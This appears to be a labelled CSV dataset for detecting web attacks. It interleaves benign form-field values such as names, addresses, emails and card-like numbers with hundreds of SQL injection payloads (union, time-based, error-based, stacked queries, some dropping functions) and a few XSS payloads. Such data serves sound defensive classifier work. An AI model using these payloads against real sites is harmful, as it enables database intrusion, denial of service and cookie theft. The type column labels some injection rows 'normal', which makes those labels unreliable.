Text,attack_type,Label,type
siles pinyol,norm,0,normal
"1"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""iuxs"" like ""iuxs",sqli,1,normal
74779691k,norm,0,normal
"1"" where 5845=5845 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
26256,norm,0,normal
31153,norm,0,normal
medioni5,norm,0,normal
5036144025003599,norm,0,normal
"-3666""))) union all select 4136,4136,4136--",sqli,1,sql
26774865j,norm,0,normal
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# kkmw",sqli,1,sql
"calle goya 46, 10?g",norm,0,normal
"1"" rlike sleep(5) and ""veub""=""veub",sqli,1,normal
brigitte,norm,0,normal
"-1277"") where 6622=6622 or 3038=3038",sqli,1,normal
"c/ francisco santos, 96",norm,0,normal
3u23pe,norm,0,normal
09228,norm,0,normal
torrecilla lafuente,norm,0,normal
1' in boolean mode);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
procacci,norm,0,normal
erickson,norm,0,normal
"1'+(select 'qvif' where 1758=1758 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
kolanko lisarde,norm,0,normal
1') and 2305=1934,sqli,1,normal
1942833835979671,norm,0,normal
"c/ observatorio meteorologico retiro 70, 3?a",norm,0,normal
werling,norm,0,normal
"-4305))) union all select 2401,2401--",sqli,1,sql
argem grive,norm,0,normal
8e6a74aer,norm,0,normal
padre maltes 26 5a,norm,0,normal
1');(select * from (select(sleep(5)))srmq) and ('kerg' like 'kerg,sqli,1,sql
09124,norm,0,normal
"1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ('rgue' like 'rgue",sqli,1,normal
"-7939"") or 3958=6909",sqli,1,normal
2815170427897112,norm,0,normal
23683952r,norm,0,normal
pintarrajar,norm,0,normal
litchterman.steiner6@myalbum.by,norm,0,normal
"-4605"") union all select 8542,8542,8542,8542,8542,8542,8542,8542--",sqli,1,sql
badosa estruch,norm,0,normal
"1%""))) and 7533=7533 and (((""%""=""",sqli,1,normal
sabety,norm,0,normal
dyment,norm,0,normal
"calle tampa 108, 7-g",norm,0,normal
schadan,norm,0,normal
"-4176'+(select 'muio' where 4256=4256 union all select 4256,4256,4256,4256,4256,4256#",sqli,1,sql
4945470408027302,norm,0,normal
1');select (case when (9130=1826) then 9130 else 9130*(select 9130 from mysql.db) end)#,sqli,1,sql
"1%"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""%""=""",sqli,1,sql
0er_rugneo,norm,0,normal
"1"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""gmld"" like ""gmld",sqli,1,sql
sort,norm,0,normal
calle de la corua 26 10?h,norm,0,normal
2214198462446690,norm,0,normal
argecilla,norm,0,normal
15198367j,norm,0,normal
53364918l,norm,0,normal
courtena,norm,0,normal
"aldea de san nicols, la",norm,0,normal
8741178125642533,norm,0,normal
sau nobrega,norm,0,normal
durovic,norm,0,normal
"1' where 2202=2202 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
mccreano,norm,0,normal
"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
23628,norm,0,normal
"-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi",sqli,1,sql
"1"") where 4182=4182 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
bartlett@waterflyesp.eh,norm,0,normal
58743816e,norm,0,normal
flaviano,norm,0,normal
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('qeet'='qeet",sqli,1,sql
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'ctac' like 'ctac",sqli,1,sql
servidio,norm,0,normal
barnhous,norm,0,normal
"calle villatorres, 109 7?d",norm,0,normal
7016,norm,0,normal
ahe2hadora,norm,0,normal
"-3315""))) union all select 2457,2457,2457,2457,2457,2457--",sqli,1,sql
moyers,norm,0,normal
"-8215%"") union all select 3877,3877,3877,3877,3877,3877--",sqli,1,sql
wager.vigo@madrid2012.wf,norm,0,normal
"1"" where 7158=7158;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
"1) union all select null,null,null,null,null,null#",sqli,1,sql
6m2rtam267t3,norm,0,normal
hi28ome458a,norm,0,normal
monzons cambeiro,norm,0,normal
"1%"")) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
alejandre.mickel@hiperbilbao.nl,norm,0,normal
ausent+e,norm,0,normal
eskoriatza,norm,0,normal
"-6200' where 9150=9150 union all select 9150,9150,9150,9150,9150,9150,9150#",sqli,1,sql
incrdu69,norm,0,normal
enjalbegada,norm,0,normal
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",sqli,1,sql
medus?a,norm,0,normal
qu1s3da,norm,0,normal
43143,norm,0,normal
alegrante,norm,0,normal
9e3ed330a,norm,0,normal
diver-domergue7@elsentidodelavida.cc,norm,0,normal
8847,norm,0,normal
kouhi,norm,0,normal
gunderso,norm,0,normal
"1%')) and 8407=(select count(*) from generate_series(1,5000000)) and (('%'='",sqli,1,sql
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""bfko""=""bfko",sqli,1,sql
p0n64793a,norm,0,normal
boix machiavelli,norm,0,normal
raina.schiavelli@hosterialasmajadillas.de,norm,0,normal
02124,norm,0,normal
17470,norm,0,normal
jaca 75,norm,0,normal
"1%'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"-7138"" union all select 2341,2341,2341,2341--",sqli,1,sql
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (9481=9481",sqli,1,sql
1') as sruz where 6318=6318;select (case when (6287=8341) then 6287 else 1/(select 0) end)--,sqli,1,sql
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq",sqli,1,sql
music jaume isern 189,norm,0,normal
"1))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((1205=1205",sqli,1,sql
8339229633184139,norm,0,normal
1948,norm,0,normal
segundo,norm,0,normal
aprea@ingenelec.es,norm,0,normal
gracomda7,norm,0,normal
"calle clara corral aller, 21,",norm,0,normal
-1470'))) or 9323=9323#,sqli,1,normal
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'ibdj'='ibdj",sqli,1,sql
"-8612') as toeu where 6357=6357 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",sqli,1,sql
"1%';select * from generate_series(9863,9863,case when (9863=3285) then 1 else 0 end) limit 1--",sqli,1,sql
clarabel,norm,0,normal
gater9,norm,0,normal
10131,norm,0,normal
isaciar,norm,0,normal
25617,norm,0,normal
750,norm,0,normal
1')) waitfor delay '0:0:5' and (('amnf' like 'amnf,sqli,1,normal
"-4093')) union all select 5785,5785,5785#",sqli,1,sql
"-5158')) or make_set(9354=9354,7185) and (('noaj' like 'noaj",sqli,1,normal
28200,norm,0,normal
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rbhe'='rbhe",sqli,1,sql
1'+(select xzvf where 9727=9727;(select * from (select(sleep(5)))acdk)#,sqli,1,sql
1'))) order by 1#,sqli,1,normal
7774409448573763,norm,0,normal
"1"" or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
darelle,norm,0,normal
1 where 9620=9620 waitfor delay '0:0:5'--,sqli,1,sql
1' in boolean mode) and 5981=6700,sqli,1,normal
"alams, els",norm,0,normal
gadea prat,norm,0,normal
shrum@uniovivirtual.nz,norm,0,normal
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
4ere3id13,norm,0,normal
marijke,norm,0,normal
44222,norm,0,normal
clooney,norm,0,normal
eguiluz estupia,norm,0,normal
1;waitfor delay '0:0:5',sqli,1,sql
"1%""))) and 4595=4595#",sqli,1,normal
1%'));if(8182=3225) select 8182 else drop function kpzk--,sqli,1,sql
"1%"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
1') as pogx where 4105=4105 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
"1%""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""%""=""",sqli,1,sql
marieann,norm,0,normal
1'))) and 4595=4595#,sqli,1,normal
plasencia de jaln,norm,0,normal
2946,norm,0,normal
gruart ola,norm,0,normal
hagon_macina@busquedadeempleo.uy,norm,0,normal
"<img id=xss src=""livescript:[code]"">",xss,2,normal
"1')) as lxjs where 6503=6503 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
08719,norm,0,normal
1'||(select 'ucxp' where 6612=6612 order by 1--,sqli,1,sql
alba2igo,norm,0,normal
"c/ san blas 146,",norm,0,normal
2362165176324303,norm,0,normal
piette,norm,0,normal
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo",sqli,1,sql
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('cfzp' like 'cfzp",sqli,1,sql
la_verne,norm,0,normal
1o3u91,norm,0,normal
"1"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
demarco_phuong@beesmer.me,norm,0,normal
molledo basagaa,norm,0,normal
"1') where 6081=6081 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
"'""--></style></script><script>alert('xss')</script>",xss,2,xss
"plza. antonio mairena, 80,",norm,0,normal
mald,norm,0,normal
"1""))) union all select null,null,null,null,null#",sqli,1,sql
00792659x,norm,0,normal
germain@elcorteitaliano.cat,norm,0,normal
1') where 3730=3730 and sleep(5)#,sqli,1,normal
"calle almonte 68, 5?g",norm,0,normal
"c/ jose maria peman, 113,",norm,0,normal
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,1,sql
postema,norm,0,normal
"-4522"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""mbkq""=""mbkq",sqli,1,sql
72620654v,norm,0,normal
8678590960416701,norm,0,normal
1940931931153821,norm,0,normal
galdano,norm,0,normal
9472991515421977,norm,0,normal
ligurs,norm,0,normal
"-5526 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
58439631n,norm,0,normal
e_ncobador,norm,0,normal
gwynne4@inoxled.kz,norm,0,normal
elivio,norm,0,normal
"1')));select benchmark(5000000,md5(0x4c4d6142)) and ((('lqwz'='lqwz",sqli,1,sql
2258,norm,0,normal
nardi borgua,norm,0,normal
"1 where 3478=3478 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
debicki@prestoesesto.hr,norm,0,normal
2864,norm,0,normal
"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""nthu"" like ""nthu",sqli,1,sql
"sequera de haza, la",norm,0,normal
1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
salar,norm,0,normal
8ef6ndo,norm,0,normal
"1""));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
cervatos de la cueza,norm,0,normal
5445,norm,0,normal
kalanit,norm,0,normal
oxley@muevetuweb.lb,norm,0,normal
"1%"") and 8626=3626#",sqli,1,normal
hermon,norm,0,normal
4471041007969479,norm,0,normal
-8716') where 5523=5523 or 3686=8485--,sqli,1,sql
tregenza,norm,0,normal
zanquita,norm,0,normal
amberina,norm,0,normal
centeno polanco,norm,0,normal
parilli cresta,norm,0,normal
velasque9,norm,0,normal
molinos,norm,0,normal
4300788041091326,norm,0,normal
cardedeu 54,norm,0,normal
pilocarpina,norm,0,normal
"1'||(select 'kfyh' where 4737=4737 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))||'",sqli,1,sql
ewoldt vaquer,norm,0,normal
1'||(select 'vuku' where 3143=3143 waitfor delay '0:0:5'--,sqli,1,sql
"-1168)) as vlol where 3475=3475 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
cristaldo marchan,norm,0,normal
-3748' where 9292=9292 or 3337=2859#,sqli,1,normal
1'||(select 'sliy' where 9494=9494;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
1' where 2547=2547 and 6969=(select 6969 from pg_sleep(5))--,sqli,1,sql
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'napi' like 'napi,sqli,1,sql
"passatge de felipe de paz 31, 8?b",norm,0,normal
"-6659') where 1256=1256 union all select 1256,1256--",sqli,1,sql
"1'+(select wjpc where 5943=5943 and make_set(8403=8403,8899))+'",sqli,1,sql
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('lshk' like 'lshk",sqli,1,normal
"1""))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((""rfam"" like ""rfam",sqli,1,sql
sandford@directoriogratuito.yu,norm,0,normal
38747653j,norm,0,normal
32505,norm,0,normal
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('xwhi'='xwhi",sqli,1,normal
8912004350396189,norm,0,normal
28092111a,norm,0,normal
calle villalon 13 1g,norm,0,normal
2787973107257855,norm,0,normal
toinette,norm,0,normal
segura,norm,0,normal
ducaux@muchachina.tk,norm,0,normal
4811716935763521,norm,0,normal
calle rafael bravo gomez 179 5?h,norm,0,normal
t2naja,norm,0,normal
vilmanse80,norm,0,normal
culpada,norm,0,normal
"-1<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>",xss,2,xss
"1"")) as rrms where 8185=8185 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
mendata,norm,0,normal
pozanco,norm,0,normal
"1') union all select null,null,null,null--",sqli,1,sql
yegorova@onlinegratis.aq,norm,0,normal
lanoszka,norm,0,normal
-5389'||(select 'gggl' where 1020=1020 union all select 1020#,sqli,1,sql
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'gfpd'='gfpd",sqli,1,sql
peda2te1ca,norm,0,normal
34597096j,norm,0,normal
"c/ geranio, 65",norm,0,normal
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('ngwt'='ngwt",sqli,1,normal
03669,norm,0,normal
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('yqrt' like 'yqrt",sqli,1,sql
gerianne,norm,0,normal
"1%"") and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""%""=""",sqli,1,sql
"-2312'))) union all select 5282,5282,5282,5282,5282,5282,5282,5282--",sqli,1,sql
duesaiges,norm,0,normal
"1""))) union all select null#",sqli,1,sql
-6890')) or 5771=7721--,sqli,1,sql
almatret,norm,0,normal
"<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",xss,2,xss
37500,norm,0,normal
enriquecedora,norm,0,normal
"1%';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
47651101t,norm,0,normal
58188584x,norm,0,normal
3690,norm,0,normal
hwei-lin,norm,0,normal
<svg><script>alert(/1/)</script>,xss,2,xss
reinaldo,norm,0,normal
jsica,norm,0,normal
"1"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""eboa"" like ""eboa",sqli,1,sql
ronet_huebner@nikemujeres.bm,norm,0,normal
"1';select count(*) from generate_series(1,5000000)--",sqli,1,sql
mahonri,norm,0,normal
"-8325)) as ajxq where 6630=6630 union all select 6630,6630,6630,6630,6630,6630--",sqli,1,sql
caamao alayo,norm,0,normal
pelletier@cementosanfranq.hu,norm,0,normal
gou,norm,0,normal
"1"" or 8421=(select count(*) from generate_series(1,5000000)) and ""ncym"" like ""ncym",sqli,1,sql
"-2790%"") union all select 5070,5070#",sqli,1,sql
plaza tilos s/n,norm,0,normal
"1') as scnn where 9274=9274;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
rowan_oldman@kpincentives.pn,norm,0,normal
-7940') union all select 6024--,sqli,1,sql
54180440f,norm,0,normal
roque,norm,0,normal
"1' in boolean mode);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"1)));select * from generate_series(7724,7724,case when (7724=8170) then 1 else 0 end) limit 1--",sqli,1,sql
4170,norm,0,normal
75817612k,norm,0,normal
1366,norm,0,normal
peirat bellv,norm,0,normal
"1"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
nodal,norm,0,normal
"plaa cesar vallejo, 58",norm,0,normal
marco polo,norm,0,normal
ramadoss,norm,0,normal
melucci,norm,0,normal
7215089345042859,norm,0,normal
milou,norm,0,normal
"1' in boolean mode) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
56,norm,0,normal
"1'+(select eztr where 4260=4260 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))+'",sqli,1,sql
2414,norm,0,normal
tarpey@bwds.ne,norm,0,normal
4906,norm,0,normal
13191,norm,0,normal
37246,norm,0,normal
jadear,norm,0,normal
nessa,norm,0,normal
"calle puebla de los infantes, 145",norm,0,normal
"calle muelles, 70, 6g",norm,0,normal
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""snht""=""snht",sqli,1,sql
"1"");begin dbms_lock.sleep(5); end and (""vwbx""=""vwbx",sqli,1,sql
1%')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('%'=',sqli,1,sql
898,norm,0,normal
palau tanquia,norm,0,normal
9171998825449770,norm,0,normal
enero,norm,0,normal
1' where 8770=8770 union all select null--,sqli,1,sql
"1) union all select null,null,null,null,null--",sqli,1,sql
"1%"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""%""=""",sqli,1,normal
tr?abal,norm,0,normal
58,norm,0,normal
"1%""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""%""=""",sqli,1,sql
36824115b,norm,0,normal
"1') where 1577=1577 union all select null,null,null,null,null,null#",sqli,1,sql
1));waitfor delay '0:0:5' and ((7619=7619,sqli,1,sql
08773,norm,0,normal
"1') as woka where 4316=4316 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
23711,norm,0,normal
5323,norm,0,normal
22311,norm,0,normal
0664227829030755,norm,0,normal
"torms, els",norm,0,normal
1') and 4822=6997 and ('ojku'='ojku,sqli,1,normal
"1"") where 2657=2657 and 5309=7592--",sqli,1,sql
"1%""))) union all select null,null,null--",sqli,1,sql
"1"" where 1683=1683 or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
oke,norm,0,normal
1856,norm,0,normal
18684547z,norm,0,normal
"zafiro, s/n 4?b",norm,0,normal
galdo palacn,norm,0,normal
"1%"");select count(*) from generate_series(1,5000000)--",sqli,1,sql
2035446499597811,norm,0,normal
gutarra marimon,norm,0,normal
2895,norm,0,normal
"1"" where 9332=9332 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
"""><iframe src='' onload=alert('mphone')>",xss,2,xss
vega del codorno,norm,0,normal
ordinar,norm,0,normal
requejo,norm,0,normal
"1%"" union all select null,null,null,null,null,null,null#",sqli,1,sql
howlett,norm,0,normal
beninger,norm,0,normal
1558387364197747,norm,0,normal
carretera de ribadesella a canero 68 10-g,norm,0,normal
"<div style=""background-image: url(javascript:document.cookie=true;)"">",xss,2,xss
"1) as yduh where 6481=6481 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"-8410"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""xhzr""=""xhzr",sqli,1,sql
"1' in boolean mode) union all select null,null#",sqli,1,sql
"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('aduc'='aduc",sqli,1,sql
1 where 7021=7021 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
"1'||(select 'mzhj' where 9677=9677 union all select null,null,null--",sqli,1,sql
6076862768016563,norm,0,normal
8737153386823279,norm,0,normal
cubas de la sagra,norm,0,normal
iriyuy,norm,0,normal
"1%"") or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1"") as nyzd where 5305=5305;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
9639,norm,0,normal
desiree,norm,0,normal
"-8309'||(select 'qecl' where 8449=8449 union all select 8449,8449,8449,8449,8449,8449,8449--",sqli,1,sql
3o7za732,norm,0,normal
77293077j,norm,0,normal
"1' where 4860=4860 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
ephrayim,norm,0,normal
1')) as pgif where 6346=6346;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
verge,norm,0,normal
witney,norm,0,normal
gambs galatioto,norm,0,normal
bedon merlach,norm,0,normal
"europa, 58 2-f",norm,0,normal
loyola,norm,0,normal
averyl,norm,0,normal
calle escalona s/n,norm,0,normal
"1"") where 9656=9656 and sleep(5)--",sqli,1,sql
1) as jvmv where 3857=3857 and (5717=6483)*6483--,sqli,1,sql
lula,norm,0,normal
sant pere pescador,norm,0,normal
linton,norm,0,normal
"1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",sqli,1,sql
"1"") where 6478=6478 union all select null,null,null,null,null,null#",sqli,1,sql
4ns38a5o4,norm,0,normal
"san petersburgo, 165",norm,0,normal
-6843' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'eeff'='eeff,sqli,1,sql
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'zjxk'='zjxk",sqli,1,sql
lucidio,norm,0,normal
quintiliana,norm,0,normal
"martel 153,",norm,0,normal
-7758%'))) or 3038=3038,sqli,1,normal
"romeral, el",norm,0,normal
"-3452%' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'='",sqli,1,sql
paseo canteras 75,norm,0,normal
58193627q,norm,0,normal
"1"") where 2152=2152;select pg_sleep(5)--",sqli,1,sql
"1)) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
shedd,norm,0,normal
"1) as cjmt where 4839=4839 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
palacn aucapia,norm,0,normal
9431159156347522,norm,0,normal
melgar clavero,norm,0,normal
lohr@show.nom.ad,norm,0,normal
"-4418"" or 6872=6872 and ""gbut""=""gbut",sqli,1,normal
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'nhmz' like 'nhmz",sqli,1,sql
reski.kuberskaya@n340magazin.no,norm,0,normal
-8636'))) or 4301=7212--,sqli,1,sql
estasio,norm,0,normal
"c/ san francisco, 45",norm,0,normal
4574,norm,0,normal
gahan,norm,0,normal
-9668')) as orfu where 5822=5822 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
"codigo correspondencia oficial correos-telegrafos 86,",norm,0,normal
